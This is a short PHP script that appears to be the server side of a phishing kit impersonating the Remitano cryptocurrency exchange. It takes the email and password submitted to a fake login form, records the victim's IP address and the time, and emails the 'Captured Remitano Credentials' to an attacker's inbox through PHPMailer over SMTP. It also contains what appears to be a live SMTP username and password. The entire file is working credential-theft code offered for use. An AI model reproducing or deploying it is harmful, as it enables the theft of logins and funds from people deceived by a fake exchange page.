<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Use Composer's autoloader
require 'vendor/autoload.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Capture submitted email and password
    $email = $_POST['email'] ?? 'no-email';
    $password = $_POST['password'] ?? 'no-password';
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $timestamp = date("Y-m-d H:i:s");

    // Build the message body
    $message = "Captured Remitano Credentials:\n\n";
    $message .= "Email: $email\n";
    $message .= "Password: $password\n";
    $message .= "IP Address: $ip\n";
    $message .= "Time: $timestamp\n";

    $mail = new PHPMailer(true);

    try {
        // SMTP configuration — update with your SMTP details!
        $mail->isSMTP();
        $mail->Host       = 'smtp.example.com';         // Your SMTP server
        $mail->SMTPAuth   = true;
        $mail->Username   = 'mwananchihuslerloans.com';   // SMTP username
        $mail->Password   = 'mokasgadsaacljec';            // SMTP password
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;  // Use TLS encryption
        $mail->Port       = 587;

        // Set sender and recipient
        $mail->setFrom('from@example.com', 'Remitano Logger');
        $mail->addAddress('recipient@example.com', 'Recipient Name');

        // Email content
        $mail->isHTML(false);
        $mail->Subject = 'New Remitano Credentials Captured';
        $mail->Body    = $message;

        $mail->send();
        echo 'Message has been sent';
    } catch (Exception $e) {
        echo "Mailer Error: {$mail->ErrorInfo}";
    }
}
